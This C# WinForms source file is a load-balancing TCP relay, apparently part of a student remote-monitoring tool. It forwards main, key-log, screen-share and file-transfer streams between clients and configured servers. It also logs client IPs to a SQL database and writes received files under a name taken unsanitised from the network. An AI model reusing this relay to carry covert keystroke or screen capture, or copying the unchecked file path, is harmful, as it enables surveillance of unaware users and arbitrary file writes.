using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Data.SqlClient;

namespace proxyProject
{
    public partial class Form1 : Form
    {
        
        private object lockObject;
        private int currentIndex;
        private List<serverEndPoint> serverAddresses;
        private static ManualResetEvent screenEvent = new ManualResetEvent(false);


        public Form1()
        {
            InitializeComponent();
            this.currentIndex = 0;
            serverAddresses = new List<serverEndPoint>();
            lockObject = new object();
            AllocConsole();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void AddBtn_Click(object sender, EventArgs e)
        {
            if (mainBx.Text != "" && KeylogBx.Text != "" && ShareBx.Text != "" && IPBx.Text != "" && fileBx.Text!="")
            {


                serverEndPoint server;
                string IPsv = IPBx.Text;
                int mainport = Convert.ToInt32(mainBx.Text);
                int keyport = Convert.ToInt32(KeylogBx.Text);
                int shareport = Convert.ToInt32(ShareBx.Text);
                int fileport = Convert.ToInt32(fileBx.Text);

                /*                string IPsv = "127.0.0.1";
                                int mainport = 9000;
                                int keyport = 9001;
                                int shareport = 9002;
                                int fileport = 9003;*/

                server = new serverEndPoint(IPsv, mainport, keyport, shareport, fileport);

                //if(CheckServerValid(server))
                //{
                dataGridView1.Rows.Add(IPsv, mainport, keyport, shareport,fileport);
                AddServer(server);
                //}
            }
            else
            {
                MessageBox.Show("Please fill all the fields");
            }
        }

        bool IsProxyOn = false;
        private void ListenBtn_Click(object sender, EventArgs e)
        {
            if (serverAddresses.Count > 0 && proxyportBx.Text!="")
            {
                if (!IsProxyOn)
                {
                    Thread t = new Thread(StartListening);
                    t.Start();
                    t.IsBackground = true;
                    IsProxyOn = true;
                }
            }
        }

        // Test IP and Ports are right
        bool CheckServerValid(serverEndPoint server)
        {
            try
            {
                IPAddress ip = IPAddress.Parse(server.serverIP);
                TcpClient client = new TcpClient();
                client.Connect(server.serverIP, server.mainport);
                client.Close();
                client = new TcpClient();
                client.Connect(server.serverIP, server.keyport);
                client.Close();
                client = new TcpClient();
                client.Connect(server.serverIP, server.shareport);
                client.Close();
                return true;
            }
            catch(SocketException) {

                MessageBox.Show("Wrong IP or port");
                return false;
            }
        }


        public void AddServer(serverEndPoint server)
        {
            lock (lockObject)
            {
                serverAddresses.Add(server);
            }

        }

        private serverEndPoint GetNextServerAddress()
        {
            lock (serverAddresses)
            {
                serverEndPoint serverAddress = serverAddresses[currentIndex];
                currentIndex = (currentIndex + 1) % serverAddresses.Count;
                return serverAddress;
            }
        }

        void LoadIP2Dtb(string ipsv, string ipclient)
        {
            SqlConnection connection = new SqlConnection(@"Data Source=desktop-toi9180\nikotine;Initial Catalog=server_manage;Integrated Security=True");

            string query = @"INSERT INTO [dbo].[table_1] ([IPsv], [IPclient]) VALUES (@ipsv, @ipclient)";

            using (SqlCommand command = new SqlCommand(query, connection))
            {
                command.Parameters.AddWithValue("@ipsv", ipsv);
                command.Parameters.AddWithValue("@ipclient", ipclient);

                try
                {
                    connection.Open();
                    command.ExecuteNonQuery();
                    Console.WriteLine("Data inserted successfully.");
                }
                catch (Exception e)
                {
                    Console.WriteLine($"An error occurred while inserting data: {e.Message}");
                }
            }
        }

        public void StartListening()
        {
            if (Int32.TryParse(proxyportBx.Text, out int port))
            {

                TcpListener listener;
                TcpListener KeyListenServer;
                TcpListener ShareListenServer;
                TcpListener FileServer;

                listener = new TcpListener(IPAddress.Any, port);
                KeyListenServer = new TcpListener(IPAddress.Any, port + 1);
                ShareListenServer = new TcpListener(IPAddress.Any, port + 2);
                FileServer = new TcpListener(IPAddress.Any, port + 3);


                listener.Start();
                KeyListenServer.Start();
                ShareListenServer.Start();
                FileServer.Start();


                while (true)
                {
                    TcpClient client;
                    TcpClient KeyClient;
                    TcpClient ShareClient;
                    TcpClient FileClient;

                    client = listener.AcceptTcpClient();
                    KeyClient = KeyListenServer.AcceptTcpClient();
                    ShareClient = ShareListenServer.AcceptTcpClient();
                    FileClient = FileServer.AcceptTcpClient();
                    Console.WriteLine("Received incoming request");
                    

                    serverEndPoint serverAddress = GetNextServerAddress();
                    LoadIP2Dtb(serverAddress.serverIP, client.Client.RemoteEndPoint.ToString());
                    Console.WriteLine($"Server address: {client.Client.RemoteEndPoint.ToString()}");
                    ThreadPool.QueueUserWorkItem((state) => HandleRequest(serverAddress, client, KeyClient, ShareClient, FileClient));
                }
            }
            else
            {
                MessageBox.Show("Port of proxy is not valid");
            }
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();


        private void HandleRequest(serverEndPoint serverAddress, TcpClient client, TcpClient KeyClient, TcpClient ShareClient, TcpClient FileClient)
        {
            try
            {
                /*server = new TcpClient(serverAddress, 9000);
                KeyServer = new TcpClient(serverAddress, 9001);
                ShareServer = new TcpClient(serverAddress, 9002);*/



                TcpClient server;
                TcpClient KeyServer;
                TcpClient ShareServer;
                TcpClient FileServer;



                /*if (serverAddress == "127.0.0.1")
                {*/

                server = new TcpClient();
                KeyServer = new TcpClient();
                ShareServer = new TcpClient();
                FileServer = new TcpClient();

                server.Connect(serverAddress.serverIP, serverAddress.mainport);
                KeyServer.Connect(serverAddress.serverIP, serverAddress.keyport);
                ShareServer.Connect(serverAddress.serverIP, serverAddress.shareport);
                FileServer.Connect(serverAddress.serverIP, serverAddress.fileport);

                
                Console.WriteLine($"Detect local: {serverAddress.serverIP} {serverAddress.fileport} ");
                //}

                /*if (serverAddress.serverIP != "127.0.0.1")
                {
                    Console.WriteLine($"Detect ngrok: {serverAddress}");
                    server = new TcpClient(serverAddress, 14968);
                    KeyServer = new TcpClient(serverAddress, 17000);
                    ShareServer = new TcpClient(serverAddress, 11681);
                }*/

                NetworkStream serverStream;
                NetworkStream KeyServerStream;
                NetworkStream ShareServerStream;
                NetworkStream FileServerStream;

                NetworkStream clientStream;
                NetworkStream KeyClientStream;
                NetworkStream ShareClientStream;
                NetworkStream FileClientStream;


                serverStream = server.GetStream();
                KeyServerStream = KeyServer.GetStream();
                ShareServerStream = ShareServer.GetStream();
                FileServerStream = FileServer.GetStream();

                clientStream = client.GetStream();
                KeyClientStream = KeyClient.GetStream();
                ShareClientStream = ShareClient.GetStream();
                FileClientStream = FileClient.GetStream();
                

                bool isScreenThreadConnecting = false;

                Thread ScreenThread;
                ScreenThread = new Thread(() => {
                    if (!isScreenThreadConnecting)
                    {
                        screenEvent.WaitOne();
                    }

                    Console.WriteLine("Share times: ");
                    ShareClientStream.CopyTo(ShareServerStream);
                    Console.WriteLine("Share done!");
                });
                ScreenThread.IsBackground = true;

                Thread KeyThread;
                KeyThread = new Thread(() =>
                {
                    Console.WriteLine("Key thread: ");
                    
                    KeyClientStream.CopyTo(KeyServerStream);
                });
                KeyThread.IsBackground= true;

                Thread FileThread = new Thread(() =>
                {
                    Console.WriteLine("File thread: ");

                    byte[] buf = new byte[4096];
                    int numbytesRead;


                    StreamReader sr = new StreamReader(FileServerStream);
                    string fileName = sr.ReadLine(); // Đọc tên tệp

                    string path = Path.Combine("./", fileName); // Đường dẫn tới tệp bao gồm tên tệp
                    FileStream fs = new FileStream(path, FileMode.CreateNew);



                    while ((numbytesRead = FileServerStream.Read(buf, 0, buf.Length)) > 0)
                    {
                        fs.Write(buf, 0, numbytesRead);
                        //int responseBytesRead = FileClientStream.Read(responseBuffer, 0, responseBuffer.Length);

                        //FileServerStream.Write(responseBuffer, 0, responseBytesRead);
                        //FileServerStream.Flush();
                    }

                    FileInfo fi = new FileInfo(path);
                    string n = fi.Name;
                    StreamWriter sw = new StreamWriter(FileClientStream);
                    sw.WriteLine(n);
                    sw.Flush();

                    fs.Close();

                    if(File.Exists(path))
                    {
                        File.Delete(path);
                    }
                    

                });
                FileThread.IsBackground = true;
                FileThread.Start();



                byte[] buffer = new byte[1024];
                int bytesRead;
                /*ManageThread = new Thread(MainThreadFunc);
                ManageThread.Start();
                ManageThread.IsBackground = true;

*/
                


                while ((bytesRead = serverStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    clientStream.Write(buffer, 0, bytesRead);
                    if (command == "Share-Screen")
                    {
                        isScreenThreadConnecting = true;

                        if (!ScreenThread.IsAlive)
                        {
                            ScreenThread.Start();

                        }
                        else screenEvent.Set();
                        
                        
                    }

                    else
                    {
                        if (command == "Key-log")
                        {
                            if(!KeyThread.IsAlive)
                            {
                                KeyThread.Start();
                            }
                        }
                    }

                    if(command == "Stop-Share")
                    {
                        isScreenThreadConnecting = false;
                    }
                    
                    /*if(command == "transfer-file")
                    {
                        if(!FileThread.IsAlive)
                        {
                            FileThread.Start();
                        }
                    }*/
                    clientStream.Write(buffer, 0, bytesRead);

                }



            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling request: {ex.Message}");
            }

        }
    }

    public class serverEndPoint
    {
        public string serverIP;
        public int mainport;
        public int keyport;
        public int shareport;
        public int fileport;

        public serverEndPoint(string s, int m, int h, int c, int f)
        {
            serverIP = s;
            mainport = m;
            keyport = h;
            shareport = c;
            fileport = f;
        }

    }



}
